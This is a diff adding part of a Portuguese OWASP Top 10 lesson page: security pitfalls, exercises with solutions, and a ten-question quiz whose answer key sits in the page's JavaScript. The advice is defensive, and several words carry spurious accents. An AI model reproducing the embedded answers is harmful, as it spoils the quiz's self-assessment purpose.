+<li><strong>Docker image scanning:</strong> Trivy ou Snyk Container no pipeline</li>
+<li><strong>Secrets scanning:</strong> git-secrets ou truffleHog para detectar credenciais commitadas</li>
+<li><strong>Branch protection:</strong> Require PR reviews, require CI passing, no force push to main</li>
+</ul>
+</div>
+
+<!-- ═══ ARMADILHAS ═══ -->
+<h3>Armadilhas Comuns</h3>
+
+<div class="tip bad">
+<span class="tip-icon">&#10060;</span>
+<div><strong>Segurança como afterthought:</strong> "Vamos lancar rápido e corrigir segurança depois." Resultado: breaches, LGPD multas, reputação destruída. Segurança não é feature — e fundação. Adicionar depois custa 10-100x mais é geralmente e incompleto.</div>
+</div>
+
+<div class="tip bad">
+<span class="tip-icon">&#10060;</span>
+<div><strong>Confiar em validação client-side:</strong> "O frontend já válida, não precisa no backend." ERRADO. Qualquer validação no frontend pode ser bypassed com curl, Postman, ou DevTools. O backend SEMPRE deve validar — o frontend válida apenas para UX.</div>
+</div>
+
+<div class="tip warn">
+<span class="tip-icon">&#9888;</span>
+<div><strong>Mensagens de erro muito detalhadas:</strong> <code>"Usuário joao@email.com não encontrado"</code> permite enumeração de usuários. <code>"Senha incorreta para joao@email.com"</code> confirma que o email existe. Use sempre: <code>"Credenciais inválidas"</code> — genérico é seguro.</div>
+</div>
+
+<div class="tip warn">
+<span class="tip-icon">&#9888;</span>
+<div><strong>Não atualizar dependências:</strong> Vulnerabilidades publicadas são exploradas em horas. Se você roda Express 4.17.0 com CVE conhecida, atacantes já tem exploit pronto. Configure Dependabot e faca updates semanais.</div>
+</div>
+
+<div class="tip good">
+<span class="tip-icon">&#10022;</span>
+<div><strong>Defense in depth:</strong> Nunca confie em uma única camada de defesa. Valide no frontend E no backend. Use Helmet E CSP E input sanitization. Se uma camada falhar, as outras ainda protegem. Segurança é como queijo suico — múltiplas fatias cobrem os buracos umas das outras.</div>
+</div>
+
+<!-- ═══ EXERCICIOS PRATICOS ═══ -->
+<h3>Exercícios Práticos</h3>
+
+<div class="qa">
+<div class="qa-q" onclick="this.parentElement.classList.toggle('open')">Exercício 1: Você tem um endpoint GET /api/invoices/:id que retorna faturas. Qualquer usuário autenticado consegue ver qualquer fatura. Como corrigir?</div>
+<div class="qa-a">
+<p><strong>Solução:</strong> Implementar verificação de ownership. Extrair o <code>userId</code> do token JWT (via decorator <code>@CurrentUser()</code>). Buscar a fatura e verificar se <code>invoice.userId === authenticatedUser.id</code>. Se o usuário não for o dono E não for admin, retornar <code>403 Forbidden</code>. Alternativamente, filtrar direto na query: <code>WHERE id = :id AND userId = :userId</code>. A abordagem por query é preferível pois evita timing attacks (atacante não sabe se o ID existe ou se não tem permissão).</p>
+</div>
+</div>
+
+<div class="qa">
+<div class="qa-q" onclick="this.parentElement.classList.toggle('open')">Exercício 2: Seu sistema usa JSON.parse() para processar webhooks de terceiros. Quais riscos existem é como mitigar?</div>
+<div class="qa-a">
+<p><strong>Resposta:</strong> <code>JSON.parse()</code> em si é seguro (não executa código), mas os riscos são: (1) <strong>Prototype pollution</strong> — payload com <code>__proto__</code> ou <code>constructor</code> pode poluir prototipos de objetos; mitigar com <code>Object.create(null)</code> ou validação de schema. (2) <strong>Denial of Service</strong> — payload extremamente grande ou profundamente aninhado pode travar o servidor; mitigar com limite de tamanho (<code>express.json({ limit: '1mb' })</code>) e validação de profundidade. (3) <strong>Webhook spoofing</strong> — atacante envia webhook falso; mitigar verificando assinatura HMAC do remetente. (4) <strong>Mass assignment</strong> — campos inesperados; mitigar com <code>ValidationPipe({ whitelist: true })</code>.</p>
+</div>
+</div>
+
+<div class="qa">
+<div class="qa-q" onclick="this.parentElement.classList.toggle('open')">Exercício 3: Projete uma estratégia de raté limiting para uma API que tem endpoints públicos (catálogo), autenticados (perfil) e admin (gerenciamento). Como diferenciar os limites?</div>
+<div class="qa-a">
+<p><strong>Solução:</strong> Aplicar raté limiting em 3 níveis: (1) <strong>Global</strong> — 100 req/min por IP para todos os endpoints (usando <code>@nestjs/throttler</code>). (2) <strong>Por tipo de endpoint:</strong> Públicos (catálogo): 60 req/min por IP. Autenticados: 200 req/min por userId (identificado pelo JWT). Auth endpoints (login/register): 5 req/min por IP (previne brute force). (3) <strong>Admin:</strong> 500 req/min por userId (admins precisam de mais throughput). Implementação: criar guards customizados que extraem o identificador correto (IP vs userId) e aplicam limites diferentes. Usar Redis para armazenar contadores (compartilhado entre instâncias). Retornar headers <code>X-RateLimit-Remaining</code> é <code>Retry-After</code> para clientes bem-comportados.</p>
+</div>
+</div>
+
+</div><!-- /section -->
+
+<!-- ═══════════════════ QUIZ ═══════════════════ -->
+<div class="quiz-section">
+<h3>Quiz — OWASP Top 10</h3>
+<p style="color:var(--text2);margin-bottom:24px;font-size:.9rem">Teste seus conhecimentos. 10 perguntas de multipla escolha. Sua pontuação será salva localmente.</p>
+
+<div id="quiz-container"></div>
+
+<div class="quiz-actions">
+<button class="btn btn-primary" id="btn-submit" onclick="submitQuiz()">Verificar Respostas</button>
+<button class="btn btn-secondary" id="btn-retry" onclick="resetQuiz()" style="display:none">Refazer Quiz</button>
+</div>
+
+<div class="quiz-result" id="quiz-result">
+<p style="color:var(--text3);font-size:.8rem;text-transform:uppercase;letter-spacing:1px">Sua Pontuação</p>
+<div class="quiz-score" id="quiz-score">0/10</div>
+<p style="color:var(--text2);font-size:.88rem" id="quiz-message"></p>
+</div>
+</div>
+
+<!-- ═══════════════════ WIZARD NAV ═══════════════════ -->
+<div class="wizard-nav">
+<a href="27-serverless-edge-computing.html">&#8592; Serverless &amp; Edge Computing</a>
+<a href="../fullstack-mastery.html" class="wizard-home" title="Voltar ao Dashboard">&#8962; Home</a>
+<a href="29-auth-oauth-jwt-rbac.html" class="primary">Próximo: Auth, OAuth, JWT &amp; RBAC &#8594;</a>
+</div>
+
+</div><!-- /content -->
+</div><!-- /main -->
+
+<script>
+// ══════════════════════════════════════════
+// QUIZ DATA — Seção 28: OWASP Top 10
+// ══════════════════════════════════════════
+const SECTION_NUM = 28;
+const STORAGE_KEY = 'fsm_quiz_' + SECTION_NUM;
+
+const QUIZ_DATA = [
+  {
+    question: "Qual é a vulnerabilidade número 1 do OWASP Top 10 é o que ela representa?",
+    options: [
+      "SQL Injection — injeção de código SQL em queries",
+      "Broken Access Control — usuários acessando recursos fora de suas permissões",
+      "Cross-Site Scripting — injeção de scripts maliciosos em páginas web",
+      "Security Misconfiguration — configurações padrão inseguras"
+    ],
+    correct: 1,
+    explanation: "Broken Access Control é o A01 do OWASP Top 10. Inclui IDOR, escalação de privilégios, e acesso a endpoints sem autorização. E a vulnerabilidade mais frequente em aplicações web modernas."
+  },
+  {
+    question: "Qual a principal defesa contra SQL Injection?",
+    options: [
+      "Validar o tamanho do input do usuário",
+      "Usar prepared statements (parametrized queries)",
+      "Escapar caracteres especiais com regex",
+      "Usar HTTPS para criptografar a comunicação"
+    ],
+    correct: 1,
+    explanation: "Prepared statements (parametrized queries) separam a query SQL dos dados. O banco de dados trata os parametros como VALORES, nunca como parte da query — tornando injeção impossível."
+  },
+  {
+    question: "Por que MD5 e SHA-256 NÃO devem ser usados para hash de senhas?",
+    options: [
+      "Porque produzem hashes muito curtos para serem seguros",
+      "Porque são muito rápidos — atacantes podem testar bilhoes de combinações por segundo",
+      "Porque não suportam caracteres Unicode",
+      "Porque produzem o mesmo hash para inputs diferentes (colisões)"
+    ],
+    correct: 1,
+    explanation: "MD5 e SHA-256 são hash functions de propósito geral — projetadas para VELOCIDADE. Com GPUs modernas, atacantes testam bilhoes de hashes/segundo. Algoritmos como bcrypt e Argon2 são intencionalmente LENTOS (centenas de milissegundos), tornando brute force impraticável."
+  },
+  {
+    question: "O que é IDOR (Insecure Direct Object Reference)?",
+    options: [
+      "Um tipo de XSS que injeta objetos JavaScript maliciosos",
+      "Quando um usuário manipula um identificador (ID) para acessar dados de outro usuário",
+      "Uma falha em criptografia que expõe objetos internós do servidor",
+      "Um ataque que injeta dependências maliciosas no package.json"
+    ],
+    correct: 1,
+    explanation: "IDOR ocorre quando a aplicação usa um ID controlado pelo usuário (ex: /api/orders/123) sem verificar se o usuário tem permissão para acessar aquele recurso. A defesa é sempre verificar ownership: WHERE id = :id AND userId = :userId."
+  },
+  {
+    question: "Qual header HTTP previne ataques de clickjacking?",
+    options: [
+      "Content-Security-Policy",
+      "X-Content-Type-Options",
+      "X-Frame-Options: DENY",
+      "Strict-Transport-Security"
+    ],
+    correct: 2,
+    explanation: "X-Frame-Options: DENY impede que sua página sejá carregada dentro de um iframe. Clickjacking é um ataque onde o atacante coloca sua página invisível sobre outra, fazendo o usuário clicar em botoes sem perceber."
+  },
+  {
+    question: "Sobre Supply Chain attacks no ecossistema npm, qual das práticas abaixo e MAIS eficaz?",
+    options: [
+      "Usar apenas pacotes com mais de 10.000 downloads semanais",
+      "Executar npm ci no CI (instala exatamente o lockfile) + npm audit + revisar PRs que alterám lockfiles",
+      "Instalar pacotes apenas de autores verificados no npm",
+      "Usar yarn ao invés de npm porque é mais seguro"
+    ],
+    correct: 1,
+    explanation: "npm ci garante instalação deterministicca a partir do lockfile, npm audit detecta vulnerabilidades conhecidas, e revisão de lockfile PRs previne lockfile poisoning. O gerenciador de pacotes (npm vs yarn) não é o fator determinante de segurança."
+  },
+  {
+    question: "Qual a forma CORRETA de tratar erros 500 em produção?",
+    options: [
+      "Retornar o stack trace completo para fácilitar debugging pelo usuário",
+      "Retornar uma mensagem genérica ao cliente e logar detalhes internamente com um correlation ID",
+      "Suprimir o erro completamente e retornar 200 OK",
+      "Retornar o nome do banco de dados é a query que falhou para ajudar no suporte"
+    ],
+    correct: 1,
+    explanation: "Stack traces, nomes de tabelas e queries expõe informações que atacantes usam para refinar ataques. A abordagem correta e retornar uma mensagem genérica com um correlation ID, e logar todos os detalhes internamente para debugging."
+  },
+  {
+    question: "O que é SRI (Subresource Integrity) e qual ataque ele previne?",
+    options: [
+      "Um protocolo de criptografia para APIs REST que previne man-in-the-middle",
+      "Um atributo HTML que verifica o hash de scripts externos, prevenindo CDN hijacking",
+      "Uma técnica de sanitização de input que previne XSS",
+      "Um header HTTP que previne CSRF em formulários"
+    ],
+    correct: 1,
+    explanation: "SRI permite específicar um hash (sha384) no atributo integrity de tags script/link. O browser calcula o hash do arquivo baixado e compara — se for diferente (CDN comprometido), o script NÃO é executado."
+  },
+  {
+    question: "Sobre validação de input, qual afirmação esta CORRETA?",
+    options: [
+      "Válidação no frontend é suficiente se usarmos frameworks como React",
+      "Válidação deve ser feita APENAS no backend para evitar duplicação de código",
+      "Válidação deve ser feita no frontend (UX) E no backend (segurança) — o backend é a autoridade",
+      "Válidação com regex no frontend e tao segura quanto no backend"
+    ],
+    correct: 2,
+    explanation: "Válidação no frontend pode ser completamente bypassed (curl, Postman, DevTools). O backend SEMPRE deve validar — é a única barreira confiável. O frontend válida apenas para melhorar a experiência do usuário (feedback rápido), não para segurança."
+  },
+  {
+    question: "Qual dos itens abaixo NUNCA deve aparecer em logs de aplicação?",
+    options: [
+      "Enderecos IP de clientes e user agents",
+      "Senhas (mesmo hasheadas), tokens de API, e números de cartao de credito",
+      "Timestamps de requisições e códigos de status HTTP",
+      "IDs de correlação de erros e nomes de endpoints"
+    ],
+    correct: 1,
+    explanation: "Senhas (mesmo hasheadas — evita coleta para rainbow tables), tokens, e dados de cartao (PCI-DSS proibe) NUNCA devem ser logados. IPs, timestamps, status codes e correlation IDs são informações válidas e necessárias para auditoria e debugging."
+  }
+];
+
+// ══════════════════════════════════════════
+// QUIZ ENGINE
+// ══════════════════════════════════════════
+let submitted = false;
+
+function renderQuiz() {
+  const container = document.getElementById('quiz-container');
+  let html = '';
+
+  QUIZ_DATA.forEach((q, i) => {
+    html += '<div class="quiz-card" id="q' + i + '">';
+    html += '<div class="quiz-question"><span class="q-num">' + (i + 1) + '.</span><span>' + q.question + '</span></div>';
+    html += '<div class="quiz-options">';
+    q.options.forEach((opt, j) => {
+      html += '<label class="quiz-option" id="q' + i + 'o' + j + '" onclick="selectOption(' + i + ',' + j + ')">';
+      html += '<input type="radio" name="q' + i + '" value="' + j + '"> ' + opt;
+      html += '</label>';
+    });
+    html += '</div>';
+    html += '<div class="quiz-explanation" id="q' + i + 'exp">' + q.explanation + '</div>';
+    html += '</div>';
+  });
+
+  container.innerHTML = html;
+}
+
+function selectOption(qIdx, oIdx) {
+  if (submitted) return;
+  const options = document.querySelectorAll('#q' + qIdx + ' .quiz-option');
+  options.forEach(o => o.classList.remove('selected'));
+  document.getElementById('q' + qIdx + 'o' + oIdx).classList.add('selected');
+}
+
+function submitQuiz() {
+  if (submitted) return;
+  submitted = true;
+
+  let score = 0;
+
+  QUIZ_DATA.forEach((q, i) => {
+    const selected = document.querySelector('input[name="q' + i + '"]:checked');
+    const selectedIdx = selected ? parseInt(selected.value) : -1;
+
+    // Show explanation
+    document.getElementById('q' + i + 'exp').classList.add('visible');
+
+    // Mark correct/wrong
+    if (selectedIdx === q.correct) {
+      score++;
+      document.getElementById('q' + i + 'o' + selectedIdx).classList.add('correct');
+    } else {
+      if (selectedIdx >= 0) {
+        document.getElementById('q' + i + 'o' + selectedIdx).classList.add('wrong');
+      }
+      document.getElementById('q' + i + 'o' + q.correct).classList.add('correct');
+    }
+  });
+
+  // Show result
+  const result = document.getElementById('quiz-result');
+  const scoreEl = document.getElementById('quiz-score');
+  const msgEl = document.getElementById('quiz-message');
+  result.classList.add('visible');
+  scoreEl.textContent = score + '/10';
+
+  if (score >= 8) {
+    scoreEl.className = 'quiz-score';
+    msgEl.textContent = 'Excelente! Você domina o OWASP Top 10.';
+  } else if (score >= 5) {
+    scoreEl.className = 'quiz-score mid';
+    msgEl.textContent = 'Bom, mas revise os conceitos que errou.';
+  } else {
+    scoreEl.className = 'quiz-score low';
+    msgEl.textContent = 'Recomendado: releia a seção e tente novamente.';
+  }
+
+  // Save to localStorage
+  const data = { score: score, total: 10, completedAt: new Date().toISOString() };
+  localStorage.setItem(STORAGE_KEY, JSON.stringify(data));
+
+  // Toggle buttons
+  document.getElementById('btn-submit').style.display = 'none';
+  document.getElementById('btn-retry').style.display = 'inline-flex';
+}
+
+function resetQuiz() {
+  submitted = false;
+  document.getElementById('quiz-result').classList.remove('visible');
+  document.getElementById('btn-submit').style.display = 'inline-flex';
+  document.getElementById('btn-retry').style.display = 'none';
+  renderQuiz();
+}
+
+// Check for previous score
+function loadPreviousScore() {
+  const saved = localStorage.getItem(STORAGE_KEY);
+  if (saved) {
+    try {
+      const data = JSON.parse(saved);
+      const tip = document.createElement('div');
+      tip.className = 'tip info';
+      tip.innerHTML = '<span class="tip-icon">i</span><div>Você já fez este quiz antes e tirou <strong>' + data.score + '/10</strong>. Pode refazer para melhorar sua nota.</div>';
+      document.querySelector('.quiz-section').insertBefore(tip, document.getElementById('quiz-container'));
+    } catch(e) {}
+  }
+}
+
+// Init
+renderQuiz();
+loadPreviousScore();
+</script>
+</body>
+</html>
